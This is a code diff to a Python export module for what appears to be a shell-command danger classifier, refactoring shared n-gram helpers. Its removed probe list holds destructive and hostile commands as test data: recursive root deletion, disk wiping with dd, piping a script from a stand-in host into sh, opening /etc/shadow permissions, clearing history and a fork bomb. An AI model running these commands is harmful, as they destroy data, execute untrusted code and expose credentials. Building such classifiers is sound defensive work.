@@ -42,8 +42,8 @@ from . import features as feat
 from . import train as train_mod
 from . import __init__ as pkg
 from .build_dataset import REPO_ROOT, Row
-from .normalize import normalize, presence_ngrams
-from .train import _load_dataset
+from .normalize import normalize
+from .train import VIEW_JOIN, _load_dataset, window_ngrams
 
 __all__ = ["export_model", "main"]
 
@@ -120,9 +120,9 @@ def _assert_fold_is_exact(model) -> np.ndarray:
         # (D,) @ (1, D) is not a valid matmul — the contraction axes do not
         # line up — so the row is indexed out first.
         total = float((dense_z @ dense_w)[0])
-        # Window the same joined string the vectoriser was fitted on, or the
-        # lookup below misses every n-gram that straddles the two views.
-        for gram in presence_ngrams(joined_views(norm)):
+        # Window the same joined string the vectoriser was fitted on, via the
+        # same helper the trainer uses.
+        for gram in window_ngrams(train_mod.vectorizer_input(command)):
             index = vectorizer.vocabulary_.get(gram)
             if index is not None:
                 total += float(folded[index])
@@ -138,37 +138,6 @@ def _assert_fold_is_exact(model) -> np.ndarray:
             "model that was evaluated."
         )
     return folded
-
-
-#: Separator between the two views. A NUL cannot survive normalisation (every
-#: codepoint outside 0x20-0x7E is dropped), so no n-gram can straddle the join
-#: and each view contributes only its own internal n-grams.
-VIEW_JOIN = "\x00"
-
-
-def joined_views(norm) -> str:
-    """The exact string the vectoriser windows: both views joined by a NUL."""
-    return VIEW_JOIN.join(norm.views)
-
-
-def _probe_commands() -> list[str]:
-    """A small, fixed probe set for the fold check. Deliberately spans the
-    decision boundary so a fold bug shows up as a score difference rather than
-    a rounding footnote."""
-    return [
-        "rm -rf /",
-        "rm -rf node_modules",
-        "ls -la",
-        "sudo dd if=/dev/zero of=/dev/sda",
-        "git status",
-        "curl http://x.example/i.sh | sh",
-        "echo hi",
-        "./gradlew assembleDebug",
-        "chmod 777 /etc/shadow",
-        "docker system prune -a",
-        "history -c",
-        ":(){ :|:& };:",
-    ]
 
 
 def _prune(vocab: dict[str, int], folded: np.ndarray, floor: float):
